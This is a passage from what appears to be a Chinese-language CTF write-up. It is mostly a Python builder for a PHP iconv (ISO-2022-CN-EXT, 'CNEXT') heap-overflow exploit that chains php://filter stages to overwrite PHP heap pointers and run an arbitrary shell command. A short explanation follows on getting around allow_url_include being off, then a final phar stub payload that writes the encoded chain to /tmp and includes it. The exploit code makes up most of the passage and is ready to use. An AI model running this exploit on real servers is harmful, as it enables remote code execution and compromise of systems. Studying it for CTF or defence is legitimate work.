</span></span><span class="line"><span class="ln">185</span><span class="cl">    <span class="n">ADDR_CUSTOM_HEAP</span> <span class="o">=</span> <span class="n">ADDR_HEAP</span> <span class="o">+</span> <span class="mh">0x0168</span>
</span></span><span class="line"><span class="ln">186</span><span class="cl">
</span></span><span class="line"><span class="ln">187</span><span class="cl">    <span class="n">ADDR_FAKE_BIN</span> <span class="o">=</span> <span class="n">ADDR_FREE_SLOT</span> <span class="o">-</span> <span class="mh">0x10</span>
</span></span><span class="line"><span class="ln">188</span><span class="cl">
</span></span><span class="line"><span class="ln">189</span><span class="cl">    <span class="n">CS</span> <span class="o">=</span> <span class="mh">0x100</span>
</span></span><span class="line"><span class="ln">190</span><span class="cl">
</span></span><span class="line"><span class="ln">191</span><span class="cl">    <span class="c1"># Pad needs to stay at size 0x100 at every step</span>
</span></span><span class="line"><span class="ln">192</span><span class="cl">    <span class="n">pad_size</span> <span class="o">=</span> <span class="n">CS</span> <span class="o">-</span> <span class="mh">0x18</span>
</span></span><span class="line"><span class="ln">193</span><span class="cl">    <span class="n">pad</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="n">pad_size</span>
</span></span><span class="line"><span class="ln">194</span><span class="cl">    <span class="n">pad</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">pad</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">195</span><span class="cl">    <span class="n">pad</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">pad</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">196</span><span class="cl">    <span class="n">pad</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">pad</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">197</span><span class="cl">    <span class="n">pad</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">198</span><span class="cl">
</span></span><span class="line"><span class="ln">199</span><span class="cl">    <span class="n">step1_size</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">200</span><span class="cl">    <span class="n">step1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="n">step1_size</span>
</span></span><span class="line"><span class="ln">201</span><span class="cl">    <span class="n">step1</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">202</span><span class="cl">    <span class="n">step1</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">203</span><span class="cl">    <span class="n">step1</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step1</span><span class="p">,</span> <span class="n">CS</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">204</span><span class="cl">    <span class="n">step1</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">205</span><span class="cl">
</span></span><span class="line"><span class="ln">206</span><span class="cl">    <span class="c1"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span>
</span></span><span class="line"><span class="ln">207</span><span class="cl">    <span class="c1"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &#34;crash&#34;</span>
</span></span><span class="line"><span class="ln">208</span><span class="cl">
</span></span><span class="line"><span class="ln">209</span><span class="cl">    <span class="n">step2_size</span> <span class="o">=</span> <span class="mh">0x48</span>
</span></span><span class="line"><span class="ln">210</span><span class="cl">    <span class="n">step2</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="n">step2_size</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">211</span><span class="cl">    <span class="n">step2</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step2</span><span class="p">,</span> <span class="n">CS</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">212</span><span class="cl">    <span class="n">step2</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">213</span><span class="cl">    <span class="n">step2</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">214</span><span class="cl">
</span></span><span class="line"><span class="ln">215</span><span class="cl">    <span class="n">step2_write_ptr</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;0</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">step2_size</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ADDR_FAKE_BIN</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">216</span><span class="cl">    <span class="n">step2_write_ptr</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step2_write_ptr</span><span class="p">,</span> <span class="n">CS</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">217</span><span class="cl">    <span class="n">step2_write_ptr</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step2_write_ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">218</span><span class="cl">    <span class="n">step2_write_ptr</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step2_write_ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">219</span><span class="cl">
</span></span><span class="line"><span class="ln">220</span><span class="cl">    <span class="n">step3_size</span> <span class="o">=</span> <span class="n">CS</span>
</span></span><span class="line"><span class="ln">221</span><span class="cl">
</span></span><span class="line"><span class="ln">222</span><span class="cl">    <span class="n">step3</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="n">step3_size</span>
</span></span><span class="line"><span class="ln">223</span><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span> <span class="o">==</span> <span class="n">CS</span>
</span></span><span class="line"><span class="ln">224</span><span class="cl">    <span class="n">step3</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">225</span><span class="cl">    <span class="n">step3</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">226</span><span class="cl">    <span class="n">step3</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">227</span><span class="cl">    <span class="n">step3</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">228</span><span class="cl">
</span></span><span class="line"><span class="ln">229</span><span class="cl">    <span class="n">step3_overflow</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="n">step3_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">BUG</span><span class="p">))</span> <span class="o">+</span> <span class="n">BUG</span>
</span></span><span class="line"><span class="ln">230</span><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span> <span class="o">==</span> <span class="n">CS</span>
</span></span><span class="line"><span class="ln">231</span><span class="cl">    <span class="n">step3_overflow</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">232</span><span class="cl">    <span class="n">step3_overflow</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">233</span><span class="cl">    <span class="n">step3_overflow</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">234</span><span class="cl">    <span class="n">step3_overflow</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">235</span><span class="cl">
</span></span><span class="line"><span class="ln">236</span><span class="cl">    <span class="n">step4_size</span> <span class="o">=</span> <span class="n">CS</span>
</span></span><span class="line"><span class="ln">237</span><span class="cl">    <span class="n">step4</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;=00&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="n">step4_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">238</span><span class="cl">    <span class="n">step4</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">239</span><span class="cl">    <span class="n">step4</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">240</span><span class="cl">    <span class="n">step4</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">241</span><span class="cl">    <span class="n">step4</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step4</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">242</span><span class="cl">
</span></span><span class="line"><span class="ln">243</span><span class="cl">    <span class="c1"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span>
</span></span><span class="line"><span class="ln">244</span><span class="cl">    <span class="c1"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span>
</span></span><span class="line"><span class="ln">245</span><span class="cl">    <span class="n">step4_pwn</span> <span class="o">=</span> <span class="n">ptr_bucket</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">246</span><span class="cl">        <span class="mh">0x200000</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">247</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">248</span><span class="cl">        <span class="c1"># free_slot</span>
</span></span><span class="line"><span class="ln">249</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">250</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">251</span><span class="cl">        <span class="n">ADDR_CUSTOM_HEAP</span><span class="p">,</span>  <span class="c1"># 0x18</span>
</span></span><span class="line"><span class="ln">252</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">253</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">254</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">255</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">256</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">257</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">258</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">259</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">260</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">261</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">262</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">263</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">264</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">265</span><span class="cl">        <span class="n">ADDR_HEAP</span><span class="p">,</span>  <span class="c1"># 0x140</span>
</span></span><span class="line"><span class="ln">266</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">267</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">268</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">269</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">270</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">271</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">272</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">273</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">274</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">275</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">276</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">277</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">278</span><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">279</span><span class="cl">        <span class="n">size</span><span class="o">=</span><span class="n">CS</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">280</span><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="ln">281</span><span class="cl">
</span></span><span class="line"><span class="ln">282</span><span class="cl">    <span class="n">step4_custom_heap</span> <span class="o">=</span> <span class="n">ptr_bucket</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">283</span><span class="cl">        <span class="n">ADDR_EMALLOC</span><span class="p">,</span> <span class="n">ADDR_EFREE</span><span class="p">,</span> <span class="n">ADDR_EREALLOC</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="ln">284</span><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="ln">285</span><span class="cl">
</span></span><span class="line"><span class="ln">286</span><span class="cl">    <span class="n">step4_use_custom_heap_size</span> <span class="o">=</span> <span class="mh">0x140</span>
</span></span><span class="line"><span class="ln">287</span><span class="cl">
</span></span><span class="line"><span class="ln">288</span><span class="cl">    <span class="n">COMMAND</span> <span class="o">=</span> <span class="n">command</span>
</span></span><span class="line"><span class="ln">289</span><span class="cl">    <span class="n">COMMAND</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;kill -9 $PPID; </span><span class="si">{</span><span class="n">COMMAND</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="ln">290</span><span class="cl">    <span class="k">if</span> <span class="n">sleep</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">291</span><span class="cl">        <span class="n">COMMAND</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;sleep </span><span class="si">{</span><span class="n">sleep</span><span class="si">}</span><span class="s2">; </span><span class="si">{</span><span class="n">COMMAND</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="ln">292</span><span class="cl">    <span class="n">COMMAND</span> <span class="o">=</span> <span class="n">COMMAND</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="ln">293</span><span class="cl">
</span></span><span class="line"><span class="ln">294</span><span class="cl">    <span class="k">assert</span> <span class="p">(</span>
</span></span><span class="line"><span class="ln">295</span><span class="cl">            <span class="nb">len</span><span class="p">(</span><span class="n">COMMAND</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">step4_use_custom_heap_size</span>
</span></span><span class="line"><span class="ln">296</span><span class="cl">    <span class="p">),</span> <span class="sa">f</span><span class="s2">&#34;Command too big (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">COMMAND</span><span class="p">)</span><span class="si">}</span><span class="s2">), it must be strictly inferior to </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">step4_use_custom_heap_size</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="ln">297</span><span class="cl">    <span class="n">COMMAND</span> <span class="o">=</span> <span class="n">COMMAND</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">step4_use_custom_heap_size</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">298</span><span class="cl">
</span></span><span class="line"><span class="ln">299</span><span class="cl">    <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">COMMAND</span>
</span></span><span class="line"><span class="ln">300</span><span class="cl">    <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">qpe</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">301</span><span class="cl">    <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">302</span><span class="cl">    <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">303</span><span class="cl">    <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">304</span><span class="cl">    <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">305</span><span class="cl">
</span></span><span class="line"><span class="ln">306</span><span class="cl">    <span class="n">pages</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="ln">307</span><span class="cl">            <span class="n">step4</span> <span class="o">*</span> <span class="mi">3</span>
</span></span><span class="line"><span class="ln">308</span><span class="cl">            <span class="o">+</span> <span class="n">step4_pwn</span>
</span></span><span class="line"><span class="ln">309</span><span class="cl">            <span class="o">+</span> <span class="n">step4_custom_heap</span>
</span></span><span class="line"><span class="ln">310</span><span class="cl">            <span class="o">+</span> <span class="n">step4_use_custom_heap</span>
</span></span><span class="line"><span class="ln">311</span><span class="cl">            <span class="o">+</span> <span class="n">step3_overflow</span>
</span></span><span class="line"><span class="ln">312</span><span class="cl">            <span class="o">+</span> <span class="n">pad</span> <span class="o">*</span> <span class="n">PAD</span>
</span></span><span class="line"><span class="ln">313</span><span class="cl">            <span class="o">+</span> <span class="n">step1</span> <span class="o">*</span> <span class="mi">3</span>
</span></span><span class="line"><span class="ln">314</span><span class="cl">            <span class="o">+</span> <span class="n">step2_write_ptr</span>
</span></span><span class="line"><span class="ln">315</span><span class="cl">            <span class="o">+</span> <span class="n">step2</span> <span class="o">*</span> <span class="mi">2</span>
</span></span><span class="line"><span class="ln">316</span><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="ln">317</span><span class="cl">
</span></span><span class="line"><span class="ln">318</span><span class="cl">    <span class="n">resource</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="n">compress</span><span class="p">(</span><span class="n">pages</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">319</span><span class="cl">    <span class="n">resource</span> <span class="o">=</span> <span class="n">b64</span><span class="p">(</span><span class="n">resource</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">320</span><span class="cl">    <span class="n">resource</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;data:text/plain;base64,</span><span class="si">{</span><span class="n">resource</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="ln">321</span><span class="cl">
</span></span><span class="line"><span class="ln">322</span><span class="cl">    <span class="n">filters</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="ln">323</span><span class="cl">        <span class="c1"># Create buckets</span>
</span></span><span class="line"><span class="ln">324</span><span class="cl">        <span class="s2">&#34;zlib.inflate&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">325</span><span class="cl">        <span class="s2">&#34;zlib.inflate&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">326</span><span class="cl">
</span></span><span class="line"><span class="ln">327</span><span class="cl">        <span class="c1"># Step 0: Setup heap</span>
</span></span><span class="line"><span class="ln">328</span><span class="cl">        <span class="s2">&#34;dechunk&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">329</span><span class="cl">        <span class="s2">&#34;convert.iconv.latin1.latin1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">330</span><span class="cl">
</span></span><span class="line"><span class="ln">331</span><span class="cl">        <span class="c1"># Step 1: Reverse FL order</span>
</span></span><span class="line"><span class="ln">332</span><span class="cl">        <span class="s2">&#34;dechunk&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">333</span><span class="cl">        <span class="s2">&#34;convert.iconv.latin1.latin1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">334</span><span class="cl">
</span></span><span class="line"><span class="ln">335</span><span class="cl">        <span class="c1"># Step 2: Put fake pointer and make FL order back to normal</span>
</span></span><span class="line"><span class="ln">336</span><span class="cl">        <span class="s2">&#34;dechunk&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">337</span><span class="cl">        <span class="s2">&#34;convert.iconv.latin1.latin1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">338</span><span class="cl">
</span></span><span class="line"><span class="ln">339</span><span class="cl">        <span class="c1"># Step 3: Trigger overflow</span>
</span></span><span class="line"><span class="ln">340</span><span class="cl">        <span class="s2">&#34;dechunk&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">341</span><span class="cl">        <span class="s2">&#34;convert.iconv.UTF-8.ISO-2022-CN-EXT&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">342</span><span class="cl">
</span></span><span class="line"><span class="ln">343</span><span class="cl">        <span class="c1"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span>
</span></span><span class="line"><span class="ln">344</span><span class="cl">        <span class="s2">&#34;convert.quoted-printable-decode&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">345</span><span class="cl">        <span class="s2">&#34;convert.iconv.latin1.latin1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">346</span><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="ln">347</span><span class="cl">    <span class="n">filters</span> <span class="o">=</span> <span class="s2">&#34;|&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">filters</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">348</span><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;php://filter/read=</span><span class="si">{</span><span class="n">filters</span><span class="si">}</span><span class="s2">/resource=</span><span class="si">{</span><span class="n">resource</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="ln">349</span><span class="cl">    <span class="c1"># print(path)</span>
</span></span><span class="line"><span class="ln">350</span><span class="cl">    <span class="k">return</span> <span class="n">path</span>
</span></span><span class="line"><span class="ln">351</span><span class="cl">
</span></span><span class="line"><span class="ln">352</span><span class="cl"><span class="k">def</span> <span class="nf">exploit</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">353</span><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">build_exploit_path</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">354</span><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">355</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">356</span><span class="cl">
</span></span><span class="line"><span class="ln">357</span><span class="cl"><span class="n">get_symbols_and_addresses</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">358</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">info</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">359</span><span class="cl"><span class="n">exploit</span><span class="p">()</span>
</span></span></code></pre></div><p><img alt="img" loading="lazy" src="../assets/1755430984426-11.png"></p>
<p>一开始想着直接include打就行了，但是发现不行，在这里卡了很久。找了一圈看看有没有其他能打cnext的函数，太菜了没找到，所以又回到include了。</p>
<p>环境没开报错，所以本地开个环境看看怎么回事。可以看到由于allow_url_include为Off，所以include里面没办法使用data://</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-12.png"></p>
<p>那这样就好办了，我们不用data://就好了，data在这个payload里面的作用是base64解码，那我们直接用php://filter解码不就好了。我们可以直接把base64的内容写到文件中，接着用php://filter读取并解码</p>
<p>最终Payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="ln"> 1</span><span class="cl">&lt;?php
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> new Phar<span class="o">(</span><span class="s1">&#39;exploit.phar&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nv">$phar</span>-&gt;startBuffering<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$stub</span> <span class="o">=</span> <span class="o">&lt;&lt;&lt;</span> <span class="s1">&#39;STUB&#39;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">&lt;?php
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    file_put_contents<span class="o">(</span><span class="s2">&#34;/tmp/base&#34;</span>,<span class="s2">&#34;e3vXsO+NiwDbg77XJm8l3/eoFzDYhCk95hLbst6xicNClfP7glt/ORo4MidWvHof/FL/+7r0Y/OyfF9FMTLgBTMObZIp3Hr76quIq9Fvtk7b6brJEb8GBrWNOu4xb8u2WoV9Fatem5o3MUcAv4YGT53TguG7Y9f2he49Gpc9M1pFmgW/jmVF8dt2RO2Nkl0d9Vv4QfXdV8+b+dev37ZX7/f20vtyv3/dmv/+/1V236DXU/ed51/lUSdHwMk/9ldfefE2Vzp3zTXdb+l35c//vbwtf31t7dvz3/dei4tPvfvd//v+/3vn//93/rPyz2n4g+xB/M7/FbYNf/49/srw6Td/8lfn3r+V9+Xvv+nfHnd+1/1XdfHffl//++Dj138Vsf//LtPPn//t92uriO/bb2XXvn396+eT27//7Yl9v/lNf2m9zTpxvb+Kz//a7v/7eY77/+R5N/vnz9ful7/970x47S6713/19c9/l+93CPf6u1XpZyUzgbg8timncGsVMGa2us28+X7/P5mT3wiETIJF/4kI46jXG11nuqh8Zh9VPKp4VDGdFc+4F5R9pmT36R23r2d4T/HYRqDEPvBlWlTystuxx+7uc4te5LKJl0AWX7b9ipTx3XdG776Z3hJSnZRLQLnB2qV5hVul4i+l7n/61O2nwP3p9+t+vlsepHSojIDOGdeCtu+I6tV/uel+1hR+McFtBIqrA1um7Tp6NavGc/rfsMU1Gzp+MAMA&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    include<span class="o">(</span><span class="s2">&#34;php://filter/read=convert.base64-decode|zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=/tmp/base&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    __HALT_COMPILER<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">?&gt;
</span></span><span class="line"><span class="ln">11</span><span class="cl">STUB<span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nv">$phar</span>-&gt;setStub<span class="o">(</span><span class="nv">$stub</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
